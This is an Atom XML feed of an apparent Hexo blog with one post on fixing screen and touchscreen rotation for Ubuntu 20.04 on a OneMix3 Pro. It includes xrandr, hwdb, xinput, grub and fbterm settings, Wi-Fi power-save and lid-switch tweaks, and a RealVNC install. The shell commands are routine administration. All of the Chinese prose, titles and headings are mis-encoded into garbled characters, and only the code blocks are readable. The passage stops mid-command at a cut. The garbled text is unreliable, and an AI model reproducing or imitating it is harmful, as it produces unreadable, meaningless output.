<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ç¥ç»æ…¢æ¸¸è€…</title>
  
  <subtitle>neurolagger</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://badb100d.com/"/>
  <updated>2020-11-16T15:59:08.000Z</updated>
  <id>https://badb100d.com/</id>
  
  <author>
    <name>badb100d</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>ä¸€å·æœ¬ OneMix3 Pro Ubuntuå±å¹•æ ¡æ­£</title>
    <link href="https://badb100d.com/2020/11/16/2020-11-16/"/>
    <id>https://badb100d.com/2020/11/16/2020-11-16/</id>
    <published>2020-11-16T15:51:02.000Z</published>
    <updated>2020-11-16T15:59:08.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>ä¹‹å‰åœ¨ä¸€å·æœ¬ï¼ˆOneMix3 Proï¼‰ä¸Šè£…çš„Ubuntuç³»ç»Ÿå› ä¸ºæ‡’å¾—åšç¯å¢ƒåˆ†ç¦»ï¼Œç»ˆäºæŠŠç¯å¢ƒæä¹±äº† T_Tï¼Œé‚é‡è£…ä¸€ä¸‹Ubuntué¡ºä¾¿å‡åˆ°æœ€æ–°ç‰ˆ20.04ã€‚</p><p>ä¸€å·æœ¬æœ‰ç‚¹ZZï¼Œä¸»æ¿å±‚é¢è®¤ä¸ºå±å¹•æ˜¯ç«–ç€çš„ï¼Œæ‰€ä»¥é™¤åŸç”Ÿ win10 ï¼ŒåŠ äº†grubä¹‹åï¼Œgrubå’Œubuntué»˜è®¤éƒ½æ˜¯ç«–å±çš„ã€‚è€Œä¹‹å‰è£…ç³»ç»Ÿçš„æ—¶å€™æ²¡æœ‰åšè¿‡ç¨‹è®°å½•ï¼Œæ‰€ä»¥å¿˜äº†ä¸Šæ¬¡æ˜¯æ€ä¹ˆè§£å†³â€œç«–å±â€é—®é¢˜çš„äº†ã€‚ã€‚ã€‚</p><p>é‡æ–°googleä¸€ç•ªï¼Œä¸»è¦å‘ç°ä»¥ä¸‹æ–¹æ³•ã€‚</p><a id="more"></a><h2 id="æ–¹æ³•ä¸€"><a href="#æ–¹æ³•ä¸€" class="headerlink" title="æ–¹æ³•ä¸€"></a>æ–¹æ³•ä¸€</h2><p>æœ€å¿«é€Ÿä¹Ÿæ˜¯æœ€ä¸‘çš„æ–¹æ³•ï¼ŒUbuntué»˜è®¤æœ‰ä¸ªæœåŠ¡<code>iio-sensor-proxy</code>ï¼Œæœ‰ç‚¹ç±»ä¼¼æ‰‹æœºä¸Šçš„â€œå±å¹•æ—‹è½¬â€ï¼Œç„¶è€Œä¸€å·æœ¬çš„åŠ é€Ÿåº¦ä¼ æ„Ÿå™¨æ–¹å‘ä¸æ˜¯å¸¸è§„çš„æ–¹å‘ï¼Œæ‰€ä»¥è¿™ä¸ªæ—‹è½¬æ€»æ˜¯å¾€é”™è¯¯çš„æ–¹å‘ç¿»è½¬ï¼Œå¯ä»¥å¸è½½è¿™ä¸ªæœåŠ¡åï¼Œæ¯æ¬¡è¿›å…¥æ¡Œé¢æ‰‹åŠ¨è®¾ç½®å±å¹•æ–¹å‘ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> å¸è½½æœåŠ¡</span></span><br><span class="line">x@One-Mix3-Pro:~$ sudo apt-get --purge remove iio-sensor-proxy</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æŸ¥çœ‹å±å¹•åç§°ï¼Œè¿™é‡Œçœ‹åˆ°æ˜¯eDP-1</span></span><br><span class="line">x@One-Mix3-Pro:~$ xrandr --query</span><br><span class="line">Screen 0: minimum 320 x 200, current 2560 x 1600, maximum 16384 x 16384</span><br><span class="line">eDP-1 connected primary 2560x1600+0+0 left (normal left inverted right x axis y axis) 113mm x 181mm</span><br><span class="line">   1600x2560     55.86*+</span><br><span class="line">HDMI-1 disconnected (normal left inverted right x axis y axis)</span><br><span class="line">DP-1 disconnected (normal left inverted right x axis y axis)</span><br><span class="line">HDMI-2 disconnected (normal left inverted right x axis y axis)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> æ¯æ¬¡ç™»é™†æ‰§è¡Œå±å¹•ç¿»è½¬ï¼Œå¯ä»¥å†™ä¸ªè‡ªå¯åŠ¨é¡¹</span></span><br><span class="line">x@One-Mix3-Pro:~$ xrandr --output eDP-1 --rotate left</span><br></pre></td></tr></table></figure><p>å¯ä»¥å†™ä¸€ä¸ªgnomeå¯åŠ¨é¡¹ï¼Œæ§åˆ¶gnomeæ¯æ¬¡ç™»é™†çš„æ—¶å€™æ‰§è¡Œå±å¹•æ—‹è½¬ã€‚</p><p>æ‰“å¼€â€œå¯åŠ¨åº”ç”¨ç¨‹åºâ€ç¨‹åº</p><img src="/2020/11/16/2020-11-16/startup.jpg" class=""><p>æˆ–è€…<code>alt + F2</code>è¿è¡Œ<code>gnome-session-properties</code>ï¼Œåœ¨å…¶ä¸­æ·»åŠ æ—‹è½¬å±å¹•å‘½ä»¤</p><img src="/2020/11/16/2020-11-16/startupapp.png" class=""><p>å†æˆ–è€…ç›´æ¥shellé‡Œæ·»åŠ gnomeå¯åŠ¨é¡¹æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">x@One-Mix3-Pro:~/.config/autostart$ cat export.desktop</span><br><span class="line">[Desktop Entry]</span><br><span class="line">Type=Application</span><br><span class="line">Exec=export DISPLAY=:0;xrandr  --output eDP-1 --rotate left</span><br><span class="line">Hidden=false</span><br><span class="line">NoDisplay=false</span><br><span class="line">X-GNOME-Autostart-enabled=true</span><br><span class="line">Name[zh_CN]=screen rotate</span><br><span class="line">Name=screen rotate</span><br><span class="line">Comment[zh_CN]=aaa</span><br><span class="line">Comment=Rotate the default screen</span><br></pre></td></tr></table></figure><p>Ubuntu 20.04ä¸Šä¸çŸ¥é“ä¸ºä»€ä¹ˆè¿™ä¸ªå¯åŠ¨é¡¹ç»å¸¸ä¸å…è®¸ï¼Œè€ç‰ˆæœ¬Ubuntuè¿™ä¸ªå¯åŠ¨é¡¹è¿˜æ˜¯æœ‰ç‚¹ç”¨çš„ã€‚</p><h2 id="æ–¹æ³•äºŒ"><a href="#æ–¹æ³•äºŒ" class="headerlink" title="æ–¹æ³•äºŒ"></a>æ–¹æ³•äºŒ</h2><p>ä¸Šé¢çš„æ–¹æ³•é€šè¿‡å¸è½½â€œå±å¹•æ—‹è½¬â€æœåŠ¡ï¼Œä½¿å¾—å±å¹•ä¸ä¼šè¢«é”™è¯¯çš„æ—‹è½¬ï¼Œä½†ä¹Ÿé€ æˆå±å¹•æ²¡æ³•è‡ªåŠ¨æ—‹è½¬ã€‚ä¸å¤ªå–œæ¬¢è¿™ç§å› å™åºŸé£Ÿçš„åšæ³•ï¼Œé‡æ–°å®‰è£…ä¸Š<code>iio-sensor-proxy</code>ï¼Œç»§ç»­çœ‹äº†ä¸‹å…¶ä»–æ–¹æ³•ã€‚</p><p>æŸ¥é˜…äº†ä¸€äº›<span class="exturl" data-url="aHR0cHM6Ly9naXQua2VybmVsLm9yZy9wdWIvc2NtL2xpbnV4L2tlcm5lbC9naXQvamljMjMvaWlvLmdpdC90cmVlL0RvY3VtZW50YXRpb24vQUJJL3Rlc3Rpbmcvc3lzZnMtYnVzLWlpbyNuMTYzOA==" title="https://git.kernel.org/pub/scm/linux/kernel/git/jic23/iio.git/tree/Documentation/ABI/testing/sysfs-bus-iio#n1638">æ–‡æ¡£<i class="fa fa-external-link"></i></span>ï¼Œå‘ç°åŠ é€Ÿåº¦ä¼ æ„Ÿå™¨çš„çŸ©é˜µå¯ä»¥æ‰‹å·¥æ ¡å‡†ï¼Œå‚è€ƒ<span class="exturl" data-url="aHR0cHM6Ly93d3cucmVkZGl0LmNvbS9yL0dQRFBvY2tldC9jb21tZW50cy9jZTZqeHIvb25lbWl4XzNzX3lvZ2Ffd191YnVudHVfMTgwNDJfaG93X2RvX2lfdGVsbF9pdC8=" title="https://www.reddit.com/r/GPDPocket/comments/ce6jxr/onemix_3s_yoga_w_ubuntu_18042_how_do_i_tell_it/">reddit<i class="fa fa-external-link"></i></span>ç½‘å‹çš„å¸–å­ï¼Œå…ˆå¯»æ‰¾åŠ é€Ÿåº¦è®¾å¤‡çš„åç§°ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /sys/`udevadm info -q path -n /dev/iio:device0`/../modalias</span><br><span class="line">acpi:BOSC0200:BOSC0200:</span><br></pre></td></tr></table></figure><p>è·å–åˆ°çš„è®¾å¤‡åç§°ä¸º<code>acpi:BOSC0200:BOSC0200:</code>ï¼Œå¢åŠ <code>61-sensor-local.hwdb</code>é…ç½®æ–‡ä»¶ï¼Œè®¾å¤‡åä¸ºä»¥ä¸‹æ ¼å¼ï¼Œå¹¶å¯¹<code>ACCEL_MOUNT_MATRIX</code>çŸ©é˜µè¿›è¡Œå¦‚ä¸‹è°ƒæ•´ï¼Œæ›´æ–°ç¡¬ä»¶æ•°æ®åº“ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /etc/udev/hwdb.d/61-sensor-local.hwdb      # ä¿®æ”¹ä¸ºå¦‚ä¸‹å†…å®¹</span><br><span class="line">sensor:modalias:acpi:BOSC0200*:dmi:*:*</span><br><span class="line"> ACCEL_MOUNT_MATRIX= -1, 0, 0; 0, 1, 0; 0, 0, 1  # 3x3çŸ©é˜µ</span><br><span class="line">root@One-Mix3-Pro:~# systemd-hwdb update                            # æ›´æ–°ç¡¬ä»¶æ•°æ®åº“</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹çŸ©é˜µçš„æ—¶å€™å¯ä»¥å‚è€ƒ<code>monitor-sensor</code>çš„å†…å®¹ï¼Œä¸æ–­è°ƒæ•´è®¾å¤‡å§¿æ€ï¼Œç¡®å®šåŸç”ŸåŠ é€Ÿåº¦ä¼ æ„Ÿå™¨æ–¹å‘ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# monitor-sensor</span><br><span class="line">    Waiting for iio-sensor-proxy to appear</span><br><span class="line">+++ iio-sensor-proxy appeared</span><br><span class="line">=== Has accelerometer (orientation: left-up)</span><br><span class="line">=== No ambient light sensor</span><br><span class="line">    Accelerometer orientation changed: bottom-up</span><br><span class="line">    Accelerometer orientation changed: left-up</span><br><span class="line">    Accelerometer orientation changed: normal</span><br><span class="line">    Accelerometer orientation changed: right-up</span><br><span class="line">    Accelerometer orientation changed: normal</span><br><span class="line">    Accelerometer orientation changed: left-up</span><br><span class="line">    Accelerometer orientation changed: normal</span><br><span class="line">    Accelerometer orientation changed: left-up</span><br></pre></td></tr></table></figure><p>é‡å¯å¹¶ç™»é™†ä»¥åï¼Œå±å¹•åŸºæœ¬å¯ä»¥æŒ‰æ­£ç¡®çš„é‡åŠ›æ–¹å‘è¿›è¡Œæ—‹è½¬äº†ã€‚é‚£ä¹ˆè¿™ä¸ªæ—¶å€™æ–°çš„é—®é¢˜å°±å‡ºç°äº†ğŸ˜‚ï¼Œè§¦å±ä¼šå¶å‘æ€§çš„æ²¡æœ‰è·Ÿéšè¿›è¡Œæ—‹è½¬ï¼Œè¿™æ ·å°±ä¼šå¯¼è‡´ä½ ç‚¹å³è¾¹ï¼Œå·¦è¾¹çš„ç¨‹åºå¯åŠ¨äº†ã€‚ã€‚ã€‚</p><p>ä¾æ—§æŸ¥é˜…æ–‡æ¡£ï¼Œå‘ç°æœ‰ä¸ªè¾“å…¥è®¾å¤‡çš„çŸ©é˜µï¼ŒæŸ¥çœ‹å½“å‰è¾“å…¥è®¾å¤‡ï¼š</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">x@One-Mix3-Pro:~$ xinput --list</span><br><span class="line">â¡ Virtual core pointer                    id=2[master pointer  (3)]</span><br><span class="line">âœ   â†³ Virtual core XTEST pointer              id=4[slave  pointer  (2)]</span><br><span class="line">âœ   â†³ HAILUCK CO.,LTD USB KEYBOARD Mouse      id=11[slave  pointer  (2)]</span><br><span class="line">âœ   â†³ GXTP7386:00 27C6:0113                   id=15[slave  pointer  (2)]</span><br><span class="line">âœ   â†³ GXTP7386:00 27C6:0113 Stylus            id=16[slave  pointer  (2)]</span><br><span class="line">â£ Virtual core keyboard                   id=3[master keyboard (2)]</span><br><span class="line">    â†³ Virtual core XTEST keyboard             id=5[slave  keyboard (3)]</span><br><span class="line">    â†³ Power Button                            id=6[slave  keyboard (3)]</span><br><span class="line">    â†³ Video Bus                               id=7[slave  keyboard (3)]</span><br><span class="line">    â†³ Power Button                            id=8[slave  keyboard (3)]</span><br><span class="line">    â†³ Sleep Button                            id=9[slave  keyboard (3)]</span><br><span class="line">    â†³ HAILUCK CO.,LTD USB KEYBOARD            id=10[slave  keyboard (3)]</span><br><span class="line">    â†³ HAILUCK CO.,LTD USB KEYBOARD System Controlid=12[slave  keyboard (3)]</span><br><span class="line">    â†³ HAILUCK CO.,LTD USB KEYBOARD Consumer Controlid=13[slave  keyboard (3)]</span><br><span class="line">    â†³ HAILUCK CO.,LTD USB KEYBOARD Wireless Radio Controlid=14[slave  keyboard (3)]</span><br><span class="line">    â†³ GXTP7386:00 27C6:0113 Keyboard          id=17[slave  keyboard (3)]</span><br><span class="line">    â†³ AT Translated Set 2 keyboard            id=18[slave  keyboard (3)]</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&#96;&#96;&#96;shell</span><br><span class="line">x@One-Mix3-Pro:~$ xinput list-props 4</span><br><span class="line">Device &#39;GXTP7386:00 27C6:0113&#39;:</span><br><span class="line">Device Enabled (168):1</span><br><span class="line">Coordinate Transformation Matrix (170):0.000000, -1.000000, 1.000000, 1.000000, 0.000000, 0.000000, 0.000000, 0.000000, 1.000000</span><br><span class="line">libinput Calibration Matrix (323):1.000000, 0.000000, 0.000000, 0.000000, 1.000000, 0.000000, 0.000000, 0.000000, 1.000000</span><br><span class="line">libinput Calibration Matrix Default (324):1.000000, 0.000000, 0.000000, 0.000000, 1.000000, 0.000000, 0.000000, 0.000000, 1.000000</span><br><span class="line">libinput Send Events Modes Available (288):1, 0</span><br><span class="line">libinput Send Events Mode Enabled (289):0, 0</span><br><span class="line">libinput Send Events Mode Enabled Default (290):0, 0</span><br><span class="line">Device Node (291):&quot;&#x2F;dev&#x2F;input&#x2F;event6&quot;</span><br><span class="line">Device Product ID (292):10182, 275</span><br></pre></td></tr></table></figure><p>æœ€åå†™äº†ä¸ªè„šæœ¬ï¼ŒæŠŠå±å¹•æ—‹è½¬çš„éƒ¨åˆ†å’Œè§¦æ‘¸å±è¯†åˆ«æ—‹è½¬çš„éƒ¨åˆ†åˆåœ¨ä¸€èµ·ï¼Œå½“è§¦æ‘¸å±è¯†åˆ«æ²¡æœ‰è·Ÿéšæ—‹è½¬æ—¶æ‰§è¡Œä¸€ä¸‹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> Screen_rotate.sh  written by badb100d</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash">portrait (left)</span></span><br><span class="line">export DISPLAY=:0</span><br><span class="line">xrandr --output eDP-1 --rotate left</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 15 is the touch screen id</span></span><br><span class="line">xinput set-prop 15 --type=float &quot;Coordinate Transformation Matrix&quot; 0 -1 1 1 0 0 0 0 1</span><br></pre></td></tr></table></figure><h2 id="é™„åŠ "><a href="#é™„åŠ " class="headerlink" title="é™„åŠ "></a>é™„åŠ </h2><h3 id="å¢å¤§grubå­—ä½“"><a href="#å¢å¤§grubå­—ä½“" class="headerlink" title="å¢å¤§grubå­—ä½“"></a>å¢å¤§grubå­—ä½“</h3><p>grub è²Œä¼¼æ˜¯æ²¡æ³•æ—‹è½¬çš„ï¼ˆé™¤épatch binaryï¼‰ï¼Œæ‰€ä»¥å°†å°±ä¸€ä¸‹è¿™ä¸ªé¢ˆæ¤ç—…åº·å¤ç‰ˆgrubã€‚ä¸è¿‡grubçš„å­—ä½“è¿˜æ˜¯å¯ä»¥è°ƒçš„ï¼Œé»˜è®¤å­—å·å¤ªå°ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# apt install ttf-unifont -y</span><br><span class="line">root@One-Mix3-Pro:~# grub-mkfont -s 32 -o /boot/grub/fonts/unicode32.pf2 /usr/share/fonts/truetype/unifont/unifont.ttf</span><br><span class="line">root@One-Mix3-Pro:~# vim /etc/default/grub     # å¢åŠ  GRUB_FONT=/boot/grub/fonts/unicode32.pf2</span><br><span class="line">root@One-Mix3-Pro:~# update-grub # æ›´æ–°grubï¼Œå†é‡å¯</span><br></pre></td></tr></table></figure><h3 id="ä¿®æ”¹-tty-ä¸‹æ—‹è½¬æ¨¡å¼"><a href="#ä¿®æ”¹-tty-ä¸‹æ—‹è½¬æ¨¡å¼" class="headerlink" title="ä¿®æ”¹ tty ä¸‹æ—‹è½¬æ¨¡å¼"></a>ä¿®æ”¹ tty ä¸‹æ—‹è½¬æ¨¡å¼</h3><p>GUIä¸‹çš„å±å¹•æ—‹è½¬è§£å†³äº†ï¼Œä½†æ˜¯æœ‰æ—¶å€™çº¯CUIæ“ä½œæ•ˆç‡æ›´é«˜ï¼Œä¹Ÿæ›´èŠ‚çº¦èµ„æºã€‚é»˜è®¤çš„ tty ç•Œé¢ï¼ˆctrl+alt+F3ï¼‰ä¹Ÿæ˜¯æ—‹è½¬çš„ï¼Œé€šè¿‡ä¿®æ”¹ grub å¯åŠ¨å‚æ•°è¿›è¡Œæ ¡æ­£ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat &#x2F;etc&#x2F;default&#x2F;grub</span><br><span class="line"># If you change this file, run &#39;update-grub&#39; afterwards to update</span><br><span class="line"># &#x2F;boot&#x2F;grub&#x2F;grub.cfg.</span><br><span class="line"># For full documentation of the options in this file, see:</span><br><span class="line">#   info -f grub -n &#39;Simple configuration&#39;</span><br><span class="line"></span><br><span class="line">GRUB_DEFAULT&#x3D;0</span><br><span class="line">GRUB_TIMEOUT_STYLE&#x3D;hidden</span><br><span class="line">GRUB_TIMEOUT&#x3D;2</span><br><span class="line">GRUB_FONT&#x3D;&#x2F;boot&#x2F;grub&#x2F;fonts&#x2F;unicode32.pf2</span><br><span class="line">GRUB_DISTRIBUTOR&#x3D;&#96;lsb_release -i -s 2&gt; &#x2F;dev&#x2F;null || echo Debian&#96;</span><br><span class="line">#GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;quiet splash&quot;</span><br><span class="line">GRUB_CMDLINE_LINUX_DEFAULT&#x3D;&quot;video&#x3D;efifb fbcon&#x3D;rotate:3 fbcon&#x3D;rotate_all:1 quiet splash&quot;</span><br><span class="line">GRUB_CMDLINE_LINUX&#x3D;&quot;net.ifnames&#x3D;0 biosdevname&#x3D;0 video&#x3D;efifb fbcon&#x3D;rotate:3 fbcon&#x3D;rotate_all:1&quot;</span><br><span class="line"></span><br><span class="line"># Uncomment to enable BadRAM filtering, modify to suit your needs</span><br><span class="line"># This works with Linux (no patch required) and with any kernel that obtains</span><br><span class="line"># the memory map information from GRUB (GNU Mach, kernel of FreeBSD ...)</span><br><span class="line">#GRUB_BADRAM&#x3D;&quot;0x01234567,0xfefefefe,0x89abcdef,0xefefefef&quot;</span><br><span class="line"></span><br><span class="line"># Uncomment to disable graphical terminal (grub-pc only)</span><br><span class="line">#GRUB_TERMINAL&#x3D;console</span><br><span class="line"></span><br><span class="line"># The resolution used on graphical terminal</span><br><span class="line"># note that you can use only modes which your graphic card supports via VBE</span><br><span class="line"># you can see them in real GRUB with the command &#96;vbeinfo&#39;</span><br><span class="line">#GRUB_GFXMODE&#x3D;640x480</span><br><span class="line"></span><br><span class="line"># Uncomment if you don&#39;t want GRUB to pass &quot;root&#x3D;UUID&#x3D;xxx&quot; parameter to Linux</span><br><span class="line">#GRUB_DISABLE_LINUX_UUID&#x3D;true</span><br><span class="line"></span><br><span class="line"># Uncomment to disable generation of recovery mode menu entries</span><br><span class="line">#GRUB_DISABLE_RECOVERY&#x3D;&quot;true&quot;</span><br><span class="line"></span><br><span class="line"># Uncomment to get a beep at grub start</span><br><span class="line">#GRUB_INIT_TUNE&#x3D;&quot;480 440 1&quot;</span><br></pre></td></tr></table></figure><p>æ›´æ–° grub å¹¶é‡å¯</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# update-grub</span><br></pre></td></tr></table></figure><h3 id="å¢åŠ -tty-ä¸‹ä¸­æ–‡å­—ç¬¦æ”¯æŒ"><a href="#å¢åŠ -tty-ä¸‹ä¸­æ–‡å­—ç¬¦æ”¯æŒ" class="headerlink" title="å¢åŠ  tty ä¸‹ä¸­æ–‡å­—ç¬¦æ”¯æŒ"></a>å¢åŠ  tty ä¸‹ä¸­æ–‡å­—ç¬¦æ”¯æŒ</h3><p>å®‰è£…<code>fbterm</code>ï¼Œé…ç½®<code>~/.fbtermrc</code>ï¼Œrootå’Œæ™®é€šç”¨æˆ·éƒ½é…ç½®ä¸€ä¸‹ã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">font-names=Ubuntu Mono</span><br><span class="line">font-size=40</span><br><span class="line">screen-rotate=3</span><br></pre></td></tr></table></figure><p>é…ç½®<code>fbterm</code>æƒé™</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setcap &#x27;cap_sys_tty_config+ep&#x27; /usr/bin/fbterm</span><br></pre></td></tr></table></figure><h3 id="å¢åŠ -rc-local-æ”¯æŒ"><a href="#å¢åŠ -rc-local-æ”¯æŒ" class="headerlink" title="å¢åŠ  rc.local æ”¯æŒ"></a>å¢åŠ  rc.local æ”¯æŒ</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /etc/systemd/system/rc-local.service</span><br><span class="line">[Unit]</span><br><span class="line"> Description=/etc/rc.local Compatibility</span><br><span class="line"> ConditionPathExists=/etc/rc.local</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line"> Type=forking</span><br><span class="line"> ExecStart=/etc/rc.local start</span><br><span class="line"> TimeoutSec=0</span><br><span class="line"> StandardOutput=tty</span><br><span class="line"> RemainAfterExit=yes</span><br><span class="line"> SysVStartPriority=99</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line"> WantedBy=multi-user.target</span><br><span class="line"> </span><br><span class="line">root@One-Mix3-Pro:~# systemctl enable rc-local; touch /etc/rc.local; chmod +x /etc/rc.local</span><br></pre></td></tr></table></figure><h3 id="æ— çº¿ç½‘å¡ä¸ä¼‘çœ "><a href="#æ— çº¿ç½‘å¡ä¸ä¼‘çœ " class="headerlink" title="æ— çº¿ç½‘å¡ä¸ä¼‘çœ "></a>æ— çº¿ç½‘å¡ä¸ä¼‘çœ </h3><p>æŸ¥çœ‹ï¼Œå¹¶ä¿®æ”¹æ— çº¿ç½‘å¡çŠ¶æ€ï¼ˆé‡å¯å¤±æ•ˆï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# iw dev wlan0 get power_save</span><br><span class="line">Power save: on</span><br><span class="line">root@One-Mix3-Pro:~# iw dev wlan0 set power_save off</span><br></pre></td></tr></table></figure><p>ä¿®æ”¹æ— çº¿ç½‘å¡é…ç½®ï¼ˆé‡å¯ä¸å¤±æ•ˆï¼‰</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# cat /etc/NetworkManager/conf.d/default-wifi-powersave-on.conf</span><br><span class="line">[connection]</span><br><span class="line">wifi.powersave = 2</span><br></pre></td></tr></table></figure><h3 id="å®‰è£…VNCï¼ˆç³»ç»Ÿè‡ªå¸¦çš„å¤ªè¾£é¸¡ï¼‰"><a href="#å®‰è£…VNCï¼ˆç³»ç»Ÿè‡ªå¸¦çš„å¤ªè¾£é¸¡ï¼‰" class="headerlink" title="å®‰è£…VNCï¼ˆç³»ç»Ÿè‡ªå¸¦çš„å¤ªè¾£é¸¡ï¼‰"></a>å®‰è£…VNCï¼ˆç³»ç»Ÿè‡ªå¸¦çš„å¤ªè¾£é¸¡ï¼‰</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# wget https://www.realvnc.com/download/file/vnc.files/VNC-Server-6.7.2-Linux-x64.deb</span><br><span class="line">root@One-Mix3-Pro:~# dpkg -i VNC-Server-6.7.2-Linux-x64.deb</span><br></pre></td></tr></table></figure><h3 id="ç›’ç›–ä¸ä¼‘çœ "><a href="#ç›’ç›–ä¸ä¼‘çœ " class="headerlink" title="ç›’ç›–ä¸ä¼‘çœ "></a>ç›’ç›–ä¸ä¼‘çœ </h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@One-Mix3-Pro:~# echo &quot;HandleLidSwitchExternalPower=ignore&quot; &gt;&gt; /etc/systemd/logind.conf</span><br><span class="line">root@One-Mix3-Pro:~# systemctl restart 